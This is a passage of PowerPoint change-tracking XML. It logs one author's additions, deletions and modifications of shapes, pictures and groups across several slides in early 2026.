          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:06:49.123" v="1041" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1319616678" sldId="318"/>
            <ac:spMk id="78" creationId="{0110A62A-D2EF-9DF0-69C2-BFE5EA5B21FE}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:grpChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:06:49.123" v="1041" actId="478"/>
          <ac:grpSpMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1319616678" sldId="318"/>
            <ac:grpSpMk id="50" creationId="{19E8D90B-E25C-3865-7A9A-047DCE2C1C03}"/>
          </ac:grpSpMkLst>
        </pc:grpChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:06:49.123" v="1041" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1319616678" sldId="318"/>
            <ac:picMk id="9" creationId="{D7972C33-A2B7-F1D2-33F2-738EA47C89CB}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add del mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:06:49.123" v="1041" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1319616678" sldId="318"/>
            <ac:picMk id="10" creationId="{306A10E3-3DA5-F670-C8D4-19AD31E75F53}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add del mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:06:49.123" v="1041" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1319616678" sldId="318"/>
            <ac:picMk id="11" creationId="{27D2A402-83EB-4130-F7D2-29E579C8A396}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:06:49.123" v="1041" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1319616678" sldId="318"/>
            <ac:picMk id="14" creationId="{C7E6F1F2-0CCB-8C7D-325F-7F49AD04FFC4}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:06:49.980" v="1042"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1319616678" sldId="318"/>
            <ac:picMk id="19" creationId="{8323B892-C91B-BE1C-5EDB-40A2357E5261}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:06:49.980" v="1042"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1319616678" sldId="318"/>
            <ac:picMk id="20" creationId="{12508282-2A5F-80AA-AE4B-3045B712F811}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:06:49.980" v="1042"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1319616678" sldId="318"/>
            <ac:picMk id="22" creationId="{0F70AE6F-238E-75D4-B985-66EC3CC9BBF6}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:06:49.123" v="1041" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1319616678" sldId="318"/>
            <ac:picMk id="28" creationId="{D520F734-4C1D-9894-26FC-16B87E09CC81}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod ord modNotesTx">
        <pc:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-02-19T15:44:20.247" v="1014" actId="20578"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1200721537" sldId="330"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:50:19.731" v="1179" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1994681297" sldId="2147308295"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:50:19.731" v="1179" actId="14100"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1994681297" sldId="2147308295"/>
            <ac:spMk id="5" creationId="{4F529E29-3D78-4088-3597-7C18CE85174B}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod addAnim delAnim modAnim">
        <pc:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:05:53.681" v="1316" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4215364585" sldId="2147308297"/>
        </pc:sldMkLst>
        <pc:spChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:55:21.706" v="1188" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="2" creationId="{B3808D46-A593-3C81-3AF7-A222CD291E95}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:55:10.432" v="1186" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="3" creationId="{DB1C4F85-4D8E-C3A2-61E7-9C5755FDC176}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:55:34.086" v="1191" actId="14100"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="8" creationId="{F6611169-D3B3-0F31-3E23-7DAF4E518B77}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:55:44.172" v="1194" actId="1038"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="9" creationId="{A75CF71C-C15D-9920-9F52-D0BB3543E9A5}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add del mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:02:36.055" v="1262" actId="931"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="11" creationId="{7BA485A5-E7A7-A4F7-14E2-0232A4C50518}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:05:53.681" v="1316" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="14" creationId="{752E4742-89C8-7A8F-11D6-BF5579236000}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:55:57.196" v="1202" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="21" creationId="{F25E1F0F-D01D-521D-33E8-27848D2A8E1F}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add del mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:03:15.622" v="1271" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="24" creationId="{AE0EBC2A-9040-FF9F-3C05-41CBC88E5E06}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:03:11.989" v="1270" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="25" creationId="{CEBB806F-1F0A-399C-0078-F347A1F295F3}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add del mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:05:03.237" v="1297" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="26" creationId="{B39FCF1D-3C7B-3440-7C1A-161BA582C9C7}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:55:05.839" v="1181" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="55" creationId="{59B79CE4-B1DB-38C9-B6BE-96677FB1104F}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:55:05.839" v="1181" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="56" creationId="{99F1D7C7-279B-BA8C-E2CC-56C6F9A51C64}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:55:05.839" v="1181" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="58" creationId="{155A3EFF-7F19-197C-ACE3-1BA318BFA6E5}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:55:05.839" v="1181" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="59" creationId="{C0AA9705-72DF-BF3D-31A9-7C034B6ACC96}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:55:05.839" v="1181" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="60" creationId="{1644BBD0-4D59-DA26-76C0-34DFBB9FDF4C}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:55:05.839" v="1181" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="62" creationId="{B781F192-769F-3A50-44F9-27A365A5CCAF}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:55:05.839" v="1181" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="98" creationId="{1B2427F3-4356-22E7-3002-F77C7A507E85}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:55:05.839" v="1181" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="100" creationId="{D0AD2596-017D-2DED-D7C5-A4B627E32431}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:55:05.839" v="1181" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:spMk id="101" creationId="{8CF719C6-0E3F-C834-8B86-12A119CE58BB}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:55:21.706" v="1188" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:picMk id="5" creationId="{0616FABA-0502-E02D-1A50-9904F4E1171A}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod ord">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:02:36.055" v="1262" actId="931"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:picMk id="13" creationId="{D0DE9CD3-2486-631B-35E3-37B491F94593}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="ord">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:01:39.346" v="1255" actId="166"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:picMk id="16" creationId="{7E860334-4410-83E6-A5BA-43F4A250A348}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T16:55:05.839" v="1181" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:picMk id="70" creationId="{A37F0ABD-F23B-397A-D1B8-E62A9DFA80C4}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:00:48.855" v="1240" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:picMk id="93" creationId="{FB1C0DC0-F334-AC24-F756-1F6EBEF06447}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add del mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:02:04.633" v="1261" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4215364585" sldId="2147308297"/>
            <ac:picMk id="1026" creationId="{CCD76977-2698-617F-6A70-5D46DD16B864}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod delAnim modAnim">
        <pc:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:15:05.825" v="1410" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1205445220" sldId="2147308298"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:04:14.922" v="1285" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:spMk id="3" creationId="{BD388149-322E-13F3-2CC6-BE9D334FF1B0}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:15:05.825" v="1410" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:spMk id="9" creationId="{D387311B-81A6-184E-4005-03AD84644037}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add del mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:07:43.726" v="1368" actId="931"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:spMk id="19" creationId="{44A27A01-7DE1-CF3A-BDAA-1A420AE2FDBB}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:07:50.076" v="1371" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:spMk id="21" creationId="{357AC920-54B3-DDCA-D8B6-D368B0546264}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:04:25.520" v="1288" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:spMk id="24" creationId="{0ECB5A68-8A85-32BA-1AEE-A41D39F857F8}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:04:25.520" v="1288" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:spMk id="25" creationId="{C30AD0C4-F22F-FE4C-D955-D4CCB30B456D}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:04:36.864" v="1293" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:spMk id="26" creationId="{68515AEA-DCFA-DF8B-0C1A-A772AE6DFD32}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod topLvl">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:10:26.550" v="1392" actId="165"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:spMk id="39" creationId="{B10CFEDC-3522-918A-21F6-1F42F8833013}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod topLvl">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:10:26.550" v="1392" actId="165"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:spMk id="40" creationId="{2725641C-CE9A-10F5-7AF1-7AB6FB168C8D}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod ord topLvl">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:10:29.417" v="1393" actId="167"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:spMk id="41" creationId="{A548CD24-AB06-EEC9-BA75-4477CC5EAC92}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod topLvl">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:10:26.550" v="1392" actId="165"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:spMk id="42" creationId="{495994EB-265E-D6C2-27AE-A71AA8F0477C}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:08:30.919" v="1375" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:spMk id="45" creationId="{1999C0BF-0AD4-6764-E5A9-0ED860C5F3E7}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:grpChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:08:23.794" v="1374" actId="478"/>
          <ac:grpSpMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:grpSpMk id="8" creationId="{E9189D81-900E-930A-2073-48F1BD92C621}"/>
          </ac:grpSpMkLst>
        </pc:grpChg>
        <pc:grpChg chg="del mod">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:10:26.550" v="1392" actId="165"/>
          <ac:grpSpMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:grpSpMk id="20" creationId="{5F24FB4D-AFDE-721C-7958-C96A0DAF2B87}"/>
          </ac:grpSpMkLst>
        </pc:grpChg>
        <pc:grpChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:08:17.091" v="1373" actId="478"/>
          <ac:grpSpMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:grpSpMk id="50" creationId="{F9C6A7EB-1357-66E2-C8F0-5DB31F5C917F}"/>
          </ac:grpSpMkLst>
        </pc:grpChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:08:13.385" v="1372" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="14" creationId="{D0D4CC67-6D5A-6D96-A842-125BEBBCEE4A}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="ord">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:07:47.744" v="1369" actId="166"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="16" creationId="{5D162EDA-FDF8-540B-B702-6AE16BE181D3}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="del">
          <ac:chgData name="Patricia LEBRUN" userId="0c97e8e9-663c-4e22-8e54-3d7500b17992" providerId="ADAL" clId="{75C975B9-5984-4BF6-963A-343AE369EBB1}" dt="2026-03-16T17:08:13.385" v="1372" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1205445220" sldId="2147308298"/>
            <ac:picMk id="18" creationId="{D0572736-CB8F-4EF5-C0C3-8DC95F441BB6}"/>
          </ac:picMkLst>
        </pc:picChg>
